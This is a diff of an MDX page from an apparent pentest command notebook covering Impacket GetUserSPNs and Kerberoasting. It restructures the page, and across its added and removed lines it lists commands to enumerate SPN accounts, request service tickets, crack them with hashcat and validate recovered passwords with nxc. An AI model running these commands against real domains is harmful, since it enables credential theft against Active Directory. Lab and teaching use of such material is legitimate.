@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/getuserspns.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: List service accounts before requesting tickets
+[Search this tool’s saved examples](/commands/notebook?tool=getuserspns) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## List service accounts before requesting tickets
 
 **Run in:** Kali. **Requires:** Working domain credentials and DC connectivity; the password is prompted.
 
@@ -21,127 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-GetUserSPNs 'DOMAIN_FQDN/USER' -dc-ip DC_IP
 ```
 
-**Read the result:** Separate listing accounts with SPNs from requesting service tickets for offline analysis.
-
-**If An SPN listing is mistaken for a recovered credential:** The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step.
+**What the result establishes:** Separate listing accounts with SPNs from requesting service tickets for offline analysis.
 
 **Next check:** Choose a relevant account and verify its context before separately requesting a service ticket for offline analysis.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Separate account discovery, ticket requests, and offline recovery
-
-Kerberoasting starts with service principals associated with accounts. A ticket artifact is encrypted material suitable for an offline password-recovery attempt under the appropriate conditions; it is not an immediately usable password. Keep the account name, SPN, encryption type and source domain with the artifact.
-
-### Find service accounts before requesting tickets
-
-```powershell
-Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName,Description,PasswordLastSet
-setspn -T DOMAIN_FQDN -Q */*
-```
-
-```bash
-impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP
-```
-
-Use a valid lab domain identity. The Impacket form prompts for a password. Computer accounts can also have SPNs; their presence alone does not make them useful password-recovery candidates. Inspect the account purpose and relevant privileges.
-
-### Request and save the relevant ticket material
-
-```bash
-impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP \
-  -request -outputfile kerberoast.txt
-```
-
-```powershell
-.\Rubeus.exe kerberoast /outfile:kerberoast.txt
-```
-
-Use the collector appropriate to the host and access you have. Confirm that the output actually contains ticket artifacts, not only banners/errors. Limit requests to the exercise scope; broad collection is not necessary when a specific account is the hypothesis.
-
-### Identify the encryption format before selecting a mode
-
-```bash
-head -n 2 kerberoast.txt
-hashcat --example-hashes
-# RC4 Kerberos TGS artifact beginning with $krb5tgs$23$:
-hashcat -m 13100 kerberoast.txt WORDLIST
-hashcat -m 13100 kerberoast.txt --show
-```
-
-The example mode is for that artifact type. AES ticket formats use different modes. An exhausted wordlist means those candidates did not recover a value under that configuration; it does not mean the account does not exist or the ticket is automatically unusable.
-
-### Validate a recovered credential in its scope
-
-```bash
-nxc smb TARGET_IP -d DOMAIN_FQDN -u SERVICE_ACCOUNT -p 'RECOVERED_PASSWORD'
-```
-
-Use one relevant host/protocol first. Then inspect the service account's groups, readable shares and object rights. Recovered credentials are not equivalent to administrator rights. If authentication fails, check domain selection, account status, password changes, logon restrictions and whether the recovered value belongs to the account you selected.
-
-Common false starts are wrong DNS/DC selection, clock disagreement, incorrectly copied artifact lines, mismatched cracking modes, and treating all SPN-bearing accounts as equally useful. Record the precise failure so the next attempt tests a different hypothesis.
-
-## GetUserSPNs.py: choose the operation and read the result
-
-List SPN accounts or request service tickets.
-
-### What the result establishes
-
-Separate listing accounts with SPNs from requesting service tickets for offline analysis.
-
-### Prerequisites and common failures
-
-The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step.
-
-### Example 1: Commands
-
-Run in: **Kali**.
-
-```bash
-impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
-impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile tickets.txt
-```
-
-### Example 2: Kerberoasting: Quick Reference
-
-Run in: **Saved lab example**.
-
-```bash
-# Linux (Impacket) — needs any valid domain creds
-GetUserSPNs.py $DOMAIN/USER:PASS -dc-ip $DC -request -outputfile kerb.hash
-# NetExec
-nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
-```
-
-Saved context: [Kerberoasting: Quick Reference — Kerberoasting: Quick Reference](/active-directory/kerberoasting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Practical Application
-
-Run in: **Saved lab example**.
-
-```shell
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
-```
-
-Saved context: [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-List SPN accounts or request service tickets.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=getuserspns) · [All tools](/index)
 
 ## Commands
 
@@ -152,18 +42,15 @@ impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP
 impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile tickets.txt
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
+## If it fails
 
-**Original note sections:** [Kerberoasting: Quick Reference — Example 1: Commands](/active-directory/kerberoasting#example-1-commands)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+| Symptom | Check |
+| --- | --- |
+| An SPN listing is mistaken for a recovered credential | The returned ticket artifact is not a plaintext password; account encryption, privileges, domain reachability and the selected cracking format affect the next step. |
 
 ## Notebook recipes
 
-9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -189,7 +76,7 @@ GetNPUsers.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AS-REP Roasting: Quick Reference — Example 3: Kerberos / Spns](/active-directory/asrep-roasting#example-3-kerberos-/-spns) · [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns)
+**Original note sections:** [Active Directory Enumeration Commands — Kerberos / Spns](/active-directory/command-reference#kerberos-/-spns)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -316,7 +203,7 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+**Original note sections:** [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -335,7 +222,7 @@ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application) · [Kerberoasting: Quick Reference — Example 3: Practical Application](/active-directory/kerberoasting#example-3-practical-application)
+**Original note sections:** [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -353,26 +240,50 @@ GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile tickets.txt
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Kerberoasting from Linux**
+</Accordion>
 
-Context from the notebook: The attack is performed from a Linux host using Impacket's  GetUserSPNs.py  script. The main prerequisite is a set of valid domain credentials (username/password or NTLM hash).
+<Accordion title="Find service accounts before requesting tickets">
 
-```text
-GetUserSPNs.py
+### Find service accounts before requesting tickets
+
+**Kerberoasting: Quick Reference**
+
+```bash
+impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberoasting from Linux — Practical Application](/active-directory/kerberoasting-linux#practical-application) · [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+**Original note sections:** [Kerberoasting: Quick Reference — Find service accounts before requesting tickets](/active-directory/kerberoasting#find-service-accounts-before-requesting-tickets)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Kerberoasting: Quick Reference">
+<Accordion title="Request and save the relevant ticket material">
 
-### Kerberoasting: Quick Reference
+### Request and save the relevant ticket material
+
+**Kerberoasting: Quick Reference**
+
+```bash
+impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP \
+  -request -outputfile kerberoast.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting: Quick Reference — Request and save the relevant ticket material](/active-directory/kerberoasting#request-and-save-the-relevant-ticket-material)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Validate a recovered credential in its scope">
+
+### Validate a recovered credential in its scope
 
 **Kerberoasting: Quick Reference**
 
@@ -385,7 +296,7 @@ nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Kerberoasting: Quick Reference — Example 2: Kerberoasting: Quick Reference](/active-directory/kerberoasting#example-2-kerberoasting-quick-reference) · [Kerberoasting: Quick Reference — Existing notes and worked examples](/active-directory/kerberoasting#existing-notes-and-worked-examples)
+**Original note sections:** [Kerberoasting: Quick Reference — Validate a recovered credential in its scope](/active-directory/kerberoasting#validate-a-recovered-credential-in-its-scope)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -394,6 +305,10 @@ nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -401,5 +316,3 @@ nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
 - [Kerberoasting: Quick Reference](/active-directory/kerberoasting)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
